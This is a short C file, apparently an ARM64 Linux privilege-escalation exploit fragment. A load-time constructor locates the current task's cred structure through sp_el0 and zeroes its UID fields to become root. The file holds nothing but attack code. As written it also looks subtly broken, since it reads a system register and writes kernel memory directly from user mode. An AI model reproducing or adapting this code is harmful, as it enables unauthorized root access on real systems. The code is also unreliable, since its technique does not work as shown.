#include "target.h"
#include <stdio.h>
#include <unistd.h>

static unsigned long get_current_task(void) {
    unsigned long sp;
    __asm__ volatile("mrs %0, sp_el0" : "=r"(sp));
    return sp & ~0xFFF;
}

__attribute__((constructor))
void init(void) {
    if (getuid() != 0) {
        unsigned long task = get_current_task();
        unsigned long cred = *(unsigned long *)(task + TASK_CRED_OFF);
        unsigned int zero = 0;
        *(unsigned int *)(cred + CRED_UID_OFF) = zero;
        *(unsigned int *)(cred + CRED_UID_OFF + 4) = zero;
        *(unsigned int *)(cred + CRED_UID_OFF + 8) = zero;
        *(unsigned int *)(cred + CRED_UID_OFF + 12) = zero;
    }
}
